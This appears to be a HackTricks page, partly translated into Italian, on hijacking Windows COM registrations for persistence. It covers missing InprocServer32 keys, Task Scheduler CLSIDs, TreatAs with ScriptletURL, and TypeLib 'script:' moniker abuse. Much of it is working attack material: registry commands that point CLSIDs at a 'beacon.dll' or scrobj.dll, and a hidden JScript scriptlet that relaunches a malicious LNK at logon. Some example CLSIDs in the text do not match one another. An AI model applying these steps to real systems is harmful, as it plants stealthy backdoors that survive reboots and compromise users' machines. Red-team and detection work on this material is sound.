# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM non esistenti

As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **meccanismo di persistenza**. Using `procmon` it's easy to find searched COM registries that don't exist yet and could be created by an attacker. Filtri classici:

- **RegOpenKey** operations.
- where the _Result_ is **NAME NOT FOUND**.
- and the _Path_ ends with **InprocServer32**.

Varianti utili durante l'hunting:

- Also look for missing **`LocalServer32`** keys. Some COM classes are out-of-process servers and will launch an attacker-controlled EXE instead of a DLL.
- Search for **`TreatAs`** and **`ScriptletURL`** registry operations in addition to `InprocServer32`. Recent detection content and malware writeups keep calling these out because they are much rarer than normal COM registrations and therefore high-signal.
- Copy the legitimate **`ThreadingModel`** from the original `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` when cloning a registration into HKCU. Using the wrong model often breaks activation and makes the hijack noisy.
- On 64-bit systems inspect both 64-bit and 32-bit views (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`) because 32-bit applications may resolve a different COM registration.

Once you have decided which non-existent COM to impersonate, execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componenti COM di Task Scheduler hijackabili

Windows Tasks usano Custom Triggers per richiamare COM objects e, poiché vengono eseguiti tramite il Task Scheduler, è più facile prevedere quando verranno attivati.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Controllando l'output puoi selezionarne uno che verrà eseguito **ogni volta che un utente effettua il login**, per esempio.

Ora cercando il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** e in HKLM e HKCU, di solito scoprirai che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Poi, puoi semplicemente creare la voce HKCU e ogni volta che l'utente effettua il logon, la tua backdoor verrà eseguita.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permette a un CLSID di essere emulato da un altro. Dal punto di vista offensivo questo significa che puoi lasciare intatto il CLSID originale, creare un secondo CLSID per utente che punti a `scrobj.dll`, e poi reindirizzare il vero oggetto COM a quello malevolo con `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Questo è utile quando:

- l'applicazione target già istanzia un CLSID stabile al logon o all'avvio dell'app
- vuoi un reindirizzamento solo tramite registro invece di sostituire il `InprocServer32` originale
- vuoi eseguire uno scriptlet `.sct` locale o remoto tramite il valore `ScriptletURL`

Esempio di workflow (adattato dal public Atomic Red Team tradecraft e da ricerche precedenti sull'abuso del registro COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Note:

- `scrobj.dll` legge il valore `ScriptletURL` e esegue lo `.sct` referenziato, quindi puoi mantenere il payload come file locale o scaricarlo da remoto via HTTP/HTTPS.
- `TreatAs` è particolarmente utile quando la registrazione COM originale è completa e stabile in HKLM, perché è necessario solo un piccolo reindirizzamento per utente invece di replicare l'intero albero.
- Per la validazione senza aspettare il trigger naturale, puoi istanziare manualmente il falso ProgID/CLSID con `rundll32.exe -sta <ProgID-or-CLSID>` se la classe target supporta l'attivazione STA.

## COM TypeLib Hijacking (script: moniker persistence)

Le Type Libraries (TypeLib) definiscono le interfacce COM e vengono caricate tramite `LoadTypeLib()`. Quando un COM server viene istanziato, l'OS può anche caricare la TypeLib associata consultando le chiavi di registro sotto `HKCR\TypeLib\{LIBID}`. Se il percorso della TypeLib è sostituito con un **moniker**, es. `script:C:\...\evil.sct`, Windows eseguirà lo scriptlet quando la TypeLib verrà risolta — generando una persistenza furtiva che si attiva quando vengono toccati componenti comuni.

Questo è stato osservato contro il Microsoft Web Browser control (caricato frequentemente da Internet Explorer, da app che incorporano WebBrowser, e persino da `explorer.exe`).

### Passaggi (PowerShell)

1) Identifica la TypeLib (LIBID) utilizzata da un CLSID ad alta frequenza. Esempio di CLSID spesso abusato dalle catene malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Indirizzare il percorso TypeLib per utente a uno scriptlet locale utilizzando il moniker `script:` (non sono necessari privilegi amministrativi):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Posiziona un file `.sct` JScript minimale che rilancia il tuo payload principale (es. un `.lnk` usato dalla catena iniziale):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Attivazione – aprire IE, un'applicazione che incorpora il WebBrowser control, o anche una normale attività di Explorer caricherà il TypeLib ed eseguirà lo scriptlet, riarmando la tua chain al logon/reboot.

Pulizia
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Note
- Puoi applicare la stessa logica ad altri componenti COM ad alta frequenza; risolvi sempre prima il reale `LIBID` da `HKCR\CLSID\{CLSID}\TypeLib`.
- Su sistemi a 64 bit puoi anche popolare la sottochiave `win64` per i client a 64 bit.

## Riferimenti

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
